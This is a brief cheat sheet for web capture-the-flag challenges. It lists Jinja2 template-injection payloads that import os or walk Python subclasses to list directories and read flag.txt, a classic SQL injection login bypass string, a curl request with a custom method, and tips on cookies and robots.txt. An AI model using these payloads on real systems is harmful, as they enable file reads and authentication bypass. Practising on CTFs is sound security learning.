### Useful things to try in web ctf challenges

```py
submit?name={{request.application.__globals__.__builtins__.__import__(%27os%27).listdir()}}
to check the flag file location
```

```py
submit?name={{%27abc%27.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0](%27flag.txt%27).read()}}
to read the vulnerability
```

```python
SQL INJECTION
'OR'1'='1
```

get the flag
$ curl -I https://r3qu35t-m3-fl4g.vishwactf.com -X FLAG

change the cookie and refresh the website it works in some cases. try observing robots.txt file of a webpage.

\x47\x75\x65\x73\x73\x20\x54\x68\x65\x20\x46\x6C\x61\x67\x73\x68\x63\x74\x66\x7B\x66\x6C\x61\x67\x7D","\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x72\x69\x67\x68\x74\x2E..
convert to hex using ascii will give the flag.

